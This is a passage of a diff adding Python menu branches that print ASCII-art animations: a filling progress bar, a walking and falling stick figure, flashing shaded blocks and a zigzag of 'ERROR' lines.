+          
+                         
+                         
+                                   
+                          
+                          
+           ----------------
+                         
+          
+          
+                                       """)
+
+        elif choice == '25':
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+
+          -----------------------
+          |                     | 0%
+          -----------------------
+          """)
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+
+          -----------------------
+          |█                    | 1%
+          -----------------------
+          """)
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+
+          -----------------------
+          |██                   | 5%
+          -----------------------
+          """)
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+          -----------------------
+          |████                 | 20%
+          -----------------------
+          """)
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+          -----------------------
+          |█████                |25%
+          -----------------------
+          """)
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+
+          -----------------------
+          |████████             |35%
+          -----------------------
+          """)
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+
+          -----------------------
+          |██████████           |40%
+          -----------------------
+          """)
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+
+
+          -----------------------
+          |████████████         |60%
+          -----------------------
+          """)
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+          -----------------------
+          |████████████         |65%
+          -----------------------
+          """)
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+
+          -----------------------
+          |██████████████       |70%
+          -----------------------
+          """)
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+          -----------------------
+          |█████████████████    |80%
+          -----------------------
+          """)
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+          -----------------------
+          |████████████████████ |100%
+          -----------------------
+          """)
+          time.sleep(0.5)
+          print("""
+
+
+
+
+
+
+
+          -----------------------
+          |▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ |100%
+          -----------------------
+          """)
+          time.sleep(0.5)
+
+        elif choice == '26':
+          time.sleep(0.4)
+          print("""
+          
+          
+          
+           0                         |
+          /|\                        |
+          / \                        |
+         ------------------------------""")
+          time.sleep(0.4)
+          print("""
+          
+          
+          
+             0                         |
+            /|\                        |
+            / \                        |
+         ------------------------------""")
+          time.sleep(0.4)
+          print("""
+          
+          
+          
+             
+             0                        |
+            /|\                       |
+         ------------------------------""")
+          time.sleep(0.4)
+          print("""
+          
+          
+          
+             
+             
+             0                         |
+         ------------------------------
+            / \                        |
+         
+         
+         """)
+          time.sleep(0.4)
+          print("""
+          
+          
+          
+             
+             
+              
+         ------------------------------
+             |                         |
+            / \                        |
+         
+         """)
+          time.sleep(0.4)
+          print("""
+          
+          
+          
+             
+             
+              
+         ------------------------------
+             0                         |
+            /|\                        |
+            / \                        |
+         """)                      
+
+          time.sleep(0.4)
+          print("""
+          
+          
+          
+             
+             
+              
+         ------------------------------
+                0                       |
+               /|\                      |
+               / \                      |
+         """)
+          time.sleep(0.7)
+
+        elif choice == '27':
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          |             /
+          |            /
+          |            
+          |     ------------
+          
+          
+          -----------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          
+          |
+          |
+          |             
+          |            /
+                      /
+                        ------------
+          
+          
+    -----------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          |
+          |
+          |
+          |             
+                       
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    -------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          -
+          |
+    |     |
+    |     |             
+    |                   
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    ----------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          ---
+    |     |
+    |     |             
+    |                   
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    ----------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          |             /
+          |            /
+          |            
+          |     ------------
+          
+          
+          -----------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          
+          |
+          |
+          |             
+          |            /
+                      /
+                        ------------
+          
+          
+    -----------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          |
+          |
+          |
+          |             
+                       
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    -------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          -
+          |
+    |     |
+    |     |             
+    |                   
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    ----------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          ---
+    |     |
+    |     |             
+    |                   
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    ----------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          |             /
+          |            /
+          |            
+          |     ------------
+          
+          
+          -----------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          
+          |
+          |
+          |             
+          |            /
+                      /
+                        ------------
+          
+          
+    -----------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          |
+          |
+          |
+          |             
+                       
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    -------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          -
+          |
+    |     |
+    |     |             
+    |                   
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    ----------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          ---
+    |     |
+    |     |             
+    |                   
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    ----------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          |             /
+          |            /
+          |            
+          |     ------------
+          
+          
+          -----------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          
+          |
+          |
+          |             
+          |            /
+                      /
+                        ------------
+          
+          
+    -----------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          |
+          |
+          |
+          |             
+                       
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    -------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          -
+          |
+    |     |
+    |     |             
+    |                   
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    ----------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          ---
+    |     |
+    |     |             
+    |                   
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    ----------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          |             /
+          |            /
+          |            
+          |     ------------
+          
+          
+          -----------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          
+          |
+          |
+          |             
+          |            /
+                      /
+                        ------------
+          
+          
+    -----------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          |
+          |
+          |
+          |             
+                       
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    -------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          -
+          |
+    |     |
+    |     |             
+    |                   
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    ----------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          ---
+    |     |
+    |     |             
+    |                   
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    ----------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          |             /
+          |            /
+          |            
+          |     ------------
+          
+          
+          -----------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          
+          |
+          |
+          |             
+          |            /
+                      /
+                        ------------
+          
+          
+    -----------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          |
+          |
+          |
+          |             
+                       
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    -------------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          -
+          |
+    |     |
+    |     |             
+    |                   
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    ----------
+          
+          
+                                     """)
+          time.sleep(0.2)
+          print("""
+          ---
+    |     |
+    |     |             
+    |                   
+    |                 /
+    |                /    ------------
+    |      
+    |      
+    ----------
+          
+          
+                                     """)
+
+
+        elif choice == '28':
+          time.sleep(0.2)
+          print("""
+          
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████ 
+         ████████████████████████
+         ████████████████████████
+          """)
+          time.sleep(0.2)
+          print("""
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+          """)
+          time.sleep(0.2)
+          print("""
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+          """)
+          time.sleep(0.2)
+          print("""
+          
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████ 
+         ████████████████████████
+         ████████████████████████
+          """)
+          time.sleep(0.2)
+          print("""
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+          """)
+          time.sleep(0.2)
+          print("""
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+          """)
+          time.sleep(0.2)
+          print("""
+          
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████ 
+         ████████████████████████
+         ████████████████████████
+          """)
+          time.sleep(0.2)
+          print("""
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+          """)
+          time.sleep(0.2)
+          print("""
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+          """)
+          time.sleep(0.2)
+          print("""
+          
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████ 
+         ████████████████████████
+         ████████████████████████
+          """)
+          time.sleep(0.2)
+          print("""
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+          """)
+          time.sleep(0.2)
+          print("""
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+          """)
+          time.sleep(0.2)
+          print("""
+          
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████ 
+         ████████████████████████
+         ████████████████████████
+          """)
+          time.sleep(0.2)
+          print("""
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+          """)
+          time.sleep(0.2)
+          print("""
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+          """)
+          time.sleep(0.2)
+          print("""
+          
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████ 
+         ████████████████████████
+         ████████████████████████
+          """)
+          time.sleep(0.2)
+          print("""
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+          """)
+          time.sleep(0.2)
+          print("""
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+          """)
+          time.sleep(0.2)
+          print("""
+          
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████ 
+         ████████████████████████
+         ████████████████████████
+          """)
+          time.sleep(0.2)
+          print("""
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+          """)
+          time.sleep(0.2)
+          print("""
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+          """)
+          time.sleep(0.2)
+          print("""
+          
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████ 
+         ████████████████████████
+         ████████████████████████
+          """)
+          time.sleep(0.2)
+          print("""
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+          """)
+          time.sleep(0.2)
+          print("""
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+          """)
+          time.sleep(0.2)
+          print("""
+          
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████
+         ████████████████████████ 
+         ████████████████████████
+         ████████████████████████
+          """)
+          time.sleep(0.2)
+          print("""
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+          """)
+          time.sleep(0.2)
+          print("""
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+          """)
+          time.sleep(0.2)
+          print("""
+          
+         ███████████████████████
+         ███████████████████████
+         ███████████████████████
+         ███████████████████████
+         ███████████████████████
+         ███████████████████████
+         ███████████████████████
+         ███████████████████████
+         ███████████████████████
+         ███████████████████████
+         ███████████████████████
+          """)
+          time.sleep(0.2)
+          print("""
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░ 
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+         ░░░░░░░░░░░░░░░░░░░░░░░░
+          """)
+          time.sleep(0.2)
+          print("""
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+          """)
+
+
+        elif choice == '29':
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
